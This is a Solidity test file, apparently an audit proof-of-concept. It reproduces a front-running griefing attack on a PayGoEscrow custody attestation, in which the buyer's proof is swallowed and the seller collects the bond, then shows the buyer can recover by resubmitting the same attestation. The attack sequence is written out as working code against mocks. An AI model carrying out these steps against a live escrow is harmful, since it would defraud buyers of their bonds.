// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// PoC for the "delivery-before-origin submission-order griefing" finding (variant C) against
// PayGoEscrow._applyCustodyLog. Mirrors the style/fixtures of test/PayGoEscrow.t.sol.
//
// Part 1 (test_finding_...) reproduces the finding's mechanism and its claimed end state
// EXACTLY as described: role==1 proven before role==0 is a silent no-op, the nullifier for
// that tx is burned forever (replay reverts), the seller then binds their own chip as Origin,
// the order completes, and after CUSTODY_WINDOW the full bond pays out to the seller despite
// the earlier on-chain mismatch evidence having existed.
//
// Part 2 (test_refutation_...) shows that this is NOT a permanent/unrecoverable loss: nothing
// in CustodyRouter.attestPossession or PayGoEscrow ties the nullifier to the *content* of the
// attestation (chip/role/signature) — only to the (height, txIndex) of whichever Ethereum tx
// carried it. CustodyRouter's digest has no nonce, so the exact same (chip, role, signature)
// bytes that appeared in the first (swallowed) tx remain a valid, resubmittable payload forever.
// Anyone who saw the first transaction's public calldata (buyer, or any bystander) can call
// attestPossession again with byte-for-byte the same arguments, mine a brand new Ethereum
// transaction, and prove THAT one — a fresh (height, txIndex) the nullifier map has never seen.
// Once Origin is bound, that fresh proof resolves the mismatch correctly and the bond goes to
// the buyer. No physical re-scan of the chip is required, contrary to the finding's claim.
import {Test} from "forge-std/Test.sol";
import {EvmV1Decoder} from "@gluwa/usc-contracts/contracts/decoding/EvmV1Decoder.sol";
import {INativeQueryVerifier} from "../contracts/Attestcoin.sol";
import {PayGoEscrow} from "../contracts/PayGoEscrow.sol";
import {DemoAsset} from "../contracts/Demo.sol";
import {MockVerifier, MockChainInfo} from "./Mocks.sol";

contract PayGoEscrowCustodyOrderPoC is Test {
    address constant VERIFIER = 0x0000000000000000000000000000000000000FD2;
    address constant CHAIN_INFO = 0x0000000000000000000000000000000000000fD3;
    uint64 constant CHAIN_KEY = 1;
    uint64 constant GRACE = 2000;
    uint64 constant CURE = 240;
    address constant ROUTER = address(0xA11CE);
    address constant CUSTODY_ROUTER = address(0xC0D1E);
    uint64 constant CUSTODY_WINDOW = 240;
    address constant USDC = address(0xBEEF);
    address constant PAYEE = address(0xFEE);
    address seller = address(0x5E11E2);
    address buyer = address(0xB0B);
    address constant realChip = address(0xC41D);      // the chip that was ACTUALLY delivered (swapped/fake)
    address constant sellerChip = address(0xF4B0F);    // the chip the fraudulent seller later binds as "Origin"

    PayGoEscrow esc;
    DemoAsset nft;
    uint256 orderId;
    uint256[] amounts;

    function setUp() public {
        vm.etch(VERIFIER, address(new MockVerifier()).code);
        vm.etch(CHAIN_INFO, address(new MockChainInfo()).code);
        nft = new DemoAsset();
        address[] memory allowed = new address[](1); allowed[0] = address(nft);
        address[] memory allowedTokens = new address[](1); allowedTokens[0] = USDC;
        esc = new PayGoEscrow(CHAIN_KEY, ROUTER, GRACE, CURE, allowed, CUSTODY_ROUTER, CUSTODY_WINDOW, allowedTokens);
        uint256 tokenId = nft.mint(seller);
        amounts.push(40e6); amounts.push(20e6); amounts.push(20e6); amounts.push(20e6);
        vm.deal(seller, 10 ether);
        vm.startPrank(seller);
        nft.approve(address(esc), tokenId);
        orderId = esc.createOrder{value: 1 ether}(buyer, nft, tokenId, PAYEE, USDC, 100e6, 4, 10_000, 1000);
        vm.stopPrank();
        MockChainInfo(CHAIN_INFO).setHeight(9_000);
    }

    // ---- fixture builders, copied verbatim from PayGoEscrow.t.sol ----

    function encodeTx(address emitter, address escrow, uint256 id, uint8 no, address payee, address token, uint256 amount, uint8 status)
        internal pure returns (bytes memory)
    {
        bytes32[] memory topics = new bytes32[](3);
        topics[0] = keccak256("InstallmentPaid(address,uint256,uint8,address,address,address,uint256)");
        topics[1] = bytes32(uint256(uint160(escrow)));
        topics[2] = bytes32(id);
        EvmV1Decoder.LogEntryTuple[] memory logs = new EvmV1Decoder.LogEntryTuple[](1);
        logs[0] = EvmV1Decoder.LogEntryTuple(emitter, topics, abi.encode(no, address(0xCAFE), payee, token, amount));
        bytes[] memory chunks = new bytes[](3);
        chunks[0] = abi.encode(uint64(0), uint64(0), address(0), false, address(0), uint256(0), bytes(""));
        chunks[1] = "";
        chunks[2] = abi.encode(status, uint64(50_000), logs, bytes(""));
        return abi.encode(uint8(2), chunks);
    }

    function goodTx(uint8 no) internal view returns (bytes memory) {
        return encodeTx(ROUTER, address(esc), orderId, no, PAYEE, USDC, amounts[no], 1);
    }

    function settleOne(uint64 height, bytes memory txb, uint64 txIndex) internal {
        uint64[] memory hs = new uint64[](1); hs[0] = height;
        bytes[] memory txs = new bytes[](1); txs[0] = txb;
        INativeQueryVerifier.MerkleProof[] memory ps = new INativeQueryVerifier.MerkleProof[](1);
        ps[0] = INativeQueryVerifier.MerkleProof(bytes32(uint256(txIndex)), new INativeQueryVerifier.MerkleProofEntry[](0));
        esc.settle(hs, txs, ps, INativeQueryVerifier.ContinuityProof(bytes32(0), new bytes32[](0)));
    }

    function encodeCustodyTx(address emitter, address escrowAddr, uint256 id, address chip, uint8 role, address submitter)
        internal pure returns (bytes memory)
    {
        bytes32[] memory topics = new bytes32[](3);
        topics[0] = keccak256("PossessionAttested(address,uint256,address,uint8,address)");
        topics[1] = bytes32(uint256(uint160(escrowAddr)));
        topics[2] = bytes32(id);
        EvmV1Decoder.LogEntryTuple[] memory logs = new EvmV1Decoder.LogEntryTuple[](1);
        logs[0] = EvmV1Decoder.LogEntryTuple(emitter, topics, abi.encode(chip, role, submitter));
        bytes[] memory chunks = new bytes[](3);
        chunks[0] = abi.encode(uint64(0), uint64(0), address(0), false, address(0), uint256(0), bytes(""));
        chunks[1] = "";
        chunks[2] = abi.encode(uint8(1), uint64(50_000), logs, bytes(""));
        return abi.encode(uint8(2), chunks);
    }

    function settleCustodyOne(uint64 height, bytes memory txb, uint64 txIndex) internal {
        uint64[] memory hs = new uint64[](1); hs[0] = height;
        bytes[] memory txs = new bytes[](1); txs[0] = txb;
        INativeQueryVerifier.MerkleProof[] memory ps = new INativeQueryVerifier.MerkleProof[](1);
        ps[0] = INativeQueryVerifier.MerkleProof(bytes32(uint256(txIndex)), new INativeQueryVerifier.MerkleProofEntry[](0));
        esc.settleCustody(hs, txs, ps, INativeQueryVerifier.ContinuityProof(bytes32(0), new bytes32[](0)));
    }

    // ============================================================================================
    // PART 1 — reproduce the finding's mechanism and its claimed end state, byte for byte.
    // ============================================================================================

    /// (b)+(c)+(d) of the task: role==1 mismatched log proven before role==0 exists is a silent
    /// no-op, and its nullifier is burned — a second proof of the IDENTICAL (height, txIndex) reverts.
    function test_finding_silentNoOpThenNullifierBurned() public {
        // Buyer honestly scans the swapped chip at delivery and it gets proven FIRST (seller front-run).
        bytes memory deliveryTx = encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, realChip, 1, buyer);
        settleCustodyOne(10_000, deliveryTx, 50);

        // silent no-op confirmed
        PayGoEscrow.Order memory o = esc.getOrder(orderId);
        assertEq(o.chipId, address(0));
        assertFalse(o.custodyVerified);
        assertFalse(o.custodyDisputed);
        assertEq(esc.bondRecipient(orderId), address(0));

        // nullifier burned: replaying the identical (height, txIndex) reverts
        vm.expectRevert("replayed");
        settleCustodyOne(10_000, deliveryTx, 50);
    }

    /// (a)-(f) of the task, following the finding's full narrative through to withdrawBond, with the
    /// buyer/observer taking NO further action after the swallowed delivery proof (the finding's
    /// implicit assumption). Confirms: full bond pays the fraudulent seller despite the mismatch
    /// evidence having existed on-chain the whole time.
    function test_finding_fullAttack_bondGoesToSellerIfNobodyResubmits() public {
        // 1. Real fraud already happened; buyer's honest delivery scan gets front-run and swallowed.
        settleCustodyOne(10_000, encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, realChip, 1, buyer), 50);
        assertEq(esc.getOrder(orderId).chipId, address(0));

        // 2. Fraudulent seller now binds Origin to a chip of their own choosing.
        settleCustodyOne(10_001, encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, sellerChip, 0, seller), 51);
        assertEq(esc.getOrder(orderId).chipId, sellerChip);
        assertFalse(esc.getOrder(orderId).custodyDisputed);
        assertFalse(esc.getOrder(orderId).custodyVerified);

        // 3. Order completes normally on payments.
        for (uint8 i; i < 4; i++) settleOne(10_000 + uint64(i) * 1000, goodTx(i), i);
        assertEq(uint8(esc.getOrder(orderId).status), uint8(PayGoEscrow.Status.Completed));

        // 4. Custody dispute window elapses, unresolved -> timeout favors the seller.
        vm.roll(block.number + CUSTODY_WINDOW + 1);
        esc.withdrawBond(orderId);
        uint256 before = seller.balance;
        vm.prank(seller);
        esc.claimBond();
        assertEq(seller.balance, before + 1 ether, "finding claim: full bond paid to fraudulent seller");
    }

    // ============================================================================================
    // PART 2 — refutation: the "unrecoverable" premise is false. CustodyRouter attestations carry
    // no nonce, so the exact public (chip, role, signature) payload from the swallowed tx can be
    // resubmitted in a brand-new Ethereum transaction by ANYONE (no physical re-scan needed) and
    // proven under a fresh (height, txIndex) once Origin is bound.
    // ============================================================================================
    function test_refutation_resubmittingSameAttestationInNewTxWinsTheBond() public {
        // 1. Same griefing setup: delivery proof swallowed, seller binds a self-serving Origin.
        settleCustodyOne(10_000, encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, realChip, 1, buyer), 50);
        settleCustodyOne(10_001, encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, sellerChip, 0, seller), 51);
        assertEq(esc.getOrder(orderId).chipId, sellerChip);
        assertFalse(esc.getOrder(orderId).custodyDisputed);

        // 2. Anyone (the buyer, or a bystander who just read the first tx's public calldata) resubmits
        //    the IDENTICAL (chip=realChip, role=1) attestation to CustodyRouter as a NEW Ethereum tx.
        //    No new chip signature or physical re-scan is required — it's the same payload, new tx.
        //    That gives a fresh (height, txIndex) never seen by the nullifier map before.
        settleCustodyOne(20_000, encodeCustodyTx(CUSTODY_ROUTER, address(esc), orderId, realChip, 1, buyer), 999);

        // 3. This time Origin is bound, so the mismatch resolves correctly.
        PayGoEscrow.Order memory o = esc.getOrder(orderId);
        assertTrue(o.custodyDisputed, "refutation: resubmission DOES prove the mismatch");
        assertEq(esc.bondRecipient(orderId), buyer);

        // 4. Order completes on payments; bond goes to the BUYER, not the seller, despite the earlier griefing.
        for (uint8 i; i < 4; i++) settleOne(10_000 + uint64(i) * 1000, goodTx(i), i);
        vm.roll(block.number + CUSTODY_WINDOW + 1);
        esc.withdrawBond(orderId);
        uint256 before = buyer.balance;
        vm.prank(buyer);
        esc.claimBond();
        assertEq(buyer.balance, before + 1 ether, "refutation: bond correctly slashed to buyer after resubmission");
    }
}
